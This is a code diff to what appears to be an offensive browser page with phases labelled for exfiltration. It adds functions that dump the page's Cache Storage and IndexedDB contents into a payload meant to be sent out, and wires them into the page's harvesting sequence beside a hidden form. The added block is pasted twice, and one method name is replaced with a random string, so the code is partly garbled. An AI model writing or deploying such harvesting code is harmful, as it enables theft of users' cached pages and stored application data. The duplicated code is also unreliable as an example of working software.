@@ -372,7 +372,7 @@
                 'getPromoExtensionNonce',
                 // navigationPerformanceLogger methods
                 'enablePerformanceLogging',
-                'constructNavigationPerformanceLogger',
+                'constrpZEAWYtiB6bJ16NuLbGCc6CZ6jJdKfb63',
                 'markNavigationStart',
                 'markLoadEventEnd',
                 'logPerformanceMetrics',
@@ -918,6 +918,156 @@
         // ══════════════════════════════════════════════════════════════
         //  Exfiltration
         // ══════════════════════════════════════════════════════════════
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 4b: Advanced Cache & DB Extraction
+        // ══════════════════════════════════════════════════════════════
+        function harvestCacheStorage() {
+            log('Phase 4b: Dumping Cache Storage API...', 'info');
+            if ('caches' in window) {
+                caches.keys().then(function (keys) {
+                    if (keys.length === 0) {
+                        log('  Cache Storage is empty', 'info');
+                        return;
+                    }
+                    keys.forEach(function (key) {
+                        caches.open(key).then(function (cache) {
+                            cache.matchAll().then(function (responses) {
+                                log('  ★ Cache "' + key + '": ' + responses.length + ' items', 'success');
+                                responses.forEach(function (response, i) {
+                                    if (i < 5) { // Limit to first 5 items per cache to avoid flooding
+                                        var url = response.url;
+                                        response.text().then(function (body) {
+                                            EXFIL.data['cache_' + key + '_' + i] = { url: url, body: body.substring(0, 500) };
+                                            addData('Cache: ' + key, url);
+                                            updatePayload();
+                                        });
+                                    }
+                                });
+                                if (responses.length > 0) updatePayload();
+                            });
+                        });
+                    });
+                }).catch(function (e) {
+                    log('  ✗ Cache Storage error: ' + e.message, 'error');
+                });
+            } else {
+                log('  Cache Storage API not supported', 'warn');
+            }
+        }
+
+        function harvestIndexedDB() {
+            log('Phase 4c: Dumping IndexedDB content...', 'info');
+            if ('indexedDB' in window && 'databases' in indexedDB) {
+                indexedDB.databases().then(function (dbs) {
+                    if (dbs.length === 0) {
+                        log('  IndexedDB is empty', 'info');
+                        return;
+                    }
+                    dbs.forEach(function (dbInfo) {
+                        var req = indexedDB.open(dbInfo.name);
+                        req.onsuccess = function (event) {
+                            var db = event.target.result;
+                            var storeNames = Array.from(db.objectStoreNames);
+                            log('  ★ IndexedDB "' + dbInfo.name + '": ' + storeNames.join(', '), 'success');
+
+                            storeNames.forEach(function (storeName) {
+                                try {
+                                    var tx = db.transaction(storeName, 'readonly');
+                                    var store = tx.objectStore(storeName);
+                                    var getAll = store.getAll(null, 20); // Get first 20 items
+                                    getAll.onsuccess = function () {
+                                        var items = getAll.result;
+                                        EXFIL.data['idb_' + dbInfo.name + '_' + storeName] = items;
+                                        addData('IDB: ' + dbInfo.name + '/' + storeName, items.length + ' items');
+                                        updatePayload();
+                                    };
+                                } catch (e) {
+                                    log('    ✗ Error reading store ' + storeName + ': ' + e.message, 'error');
+                                }
+                            });
+                        };
+                    });
+                }).catch(function (e) {
+                    log('  IndexedDB enumeration error: ' + e.message, 'error');
+                });
+            }
+        }
+
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 4b: Advanced Cache & DB Extraction
+        // ══════════════════════════════════════════════════════════════
+        function harvestCacheStorage() {
+            log('Phase 4b: Dumping Cache Storage API...', 'info');
+            if ('caches' in window) {
+                caches.keys().then(function (keys) {
+                    if (keys.length === 0) {
+                        log('  Cache Storage is empty', 'info');
+                        return;
+                    }
+                    keys.forEach(function (key) {
+                        caches.open(key).then(function (cache) {
+                            cache.matchAll().then(function (responses) {
+                                log('  ★ Cache "' + key + '": ' + responses.length + ' items', 'success');
+                                responses.forEach(function (response, i) {
+                                    if (i < 5) { // Limit to first 5 items per cache to avoid flooding
+                                        var url = response.url;
+                                        response.text().then(function (body) {
+                                            EXFIL.data['cache_' + key + '_' + i] = { url: url, body: body.substring(0, 500) };
+                                            addData('Cache: ' + key, url);
+                                            updatePayload();
+                                        });
+                                    }
+                                });
+                                if (responses.length > 0) updatePayload();
+                            });
+                        });
+                    });
+                }).catch(function (e) {
+                    log('  ✗ Cache Storage error: ' + e.message, 'error');
+                });
+            } else {
+                log('  Cache Storage API not supported', 'warn');
+            }
+        }
+
+        function harvestIndexedDB() {
+            log('Phase 4c: Dumping IndexedDB content...', 'info');
+            if ('indexedDB' in window && 'databases' in indexedDB) {
+                indexedDB.databases().then(function (dbs) {
+                    if (dbs.length === 0) {
+                        log('  IndexedDB is empty', 'info');
+                        return;
+                    }
+                    dbs.forEach(function (dbInfo) {
+                        var req = indexedDB.open(dbInfo.name);
+                        req.onsuccess = function (event) {
+                            var db = event.target.result;
+                            var storeNames = Array.from(db.objectStoreNames);
+                            log('  ★ IndexedDB "' + dbInfo.name + '": ' + storeNames.join(', '), 'success');
+
+                            storeNames.forEach(function (storeName) {
+                                try {
+                                    var tx = db.transaction(storeName, 'readonly');
+                                    var store = tx.objectStore(storeName);
+                                    var getAll = store.getAll(null, 20); // Get first 20 items
+                                    getAll.onsuccess = function () {
+                                        var items = getAll.result;
+                                        EXFIL.data['idb_' + dbInfo.name + '_' + storeName] = items;
+                                        addData('IDB: ' + dbInfo.name + '/' + storeName, items.length + ' items');
+                                        updatePayload();
+                                    };
+                                } catch (e) {
+                                    log('    ✗ Error reading store ' + storeName + ': ' + e.message, 'error');
+                                }
+                            });
+                        };
+                    });
+                }).catch(function (e) {
+                    log('  IndexedDB enumeration error: ' + e.message, 'error');
+                });
+            }
+        }
+
         function updatePayload() {
             EXFIL.timestamp = new Date().toISOString();
             document.getElementById('exfilPayload').value = JSON.stringify(EXFIL, null, 2);
@@ -1040,6 +1190,8 @@
 
                 // Phase 4
                 harvestBrowserData();
+                harvestCacheStorage();
+                harvestIndexedDB();
 
                 // Hidden form
                 createHiddenForm();
@@ -1061,4 +1213,3 @@
 </body>
 
 </html>
-
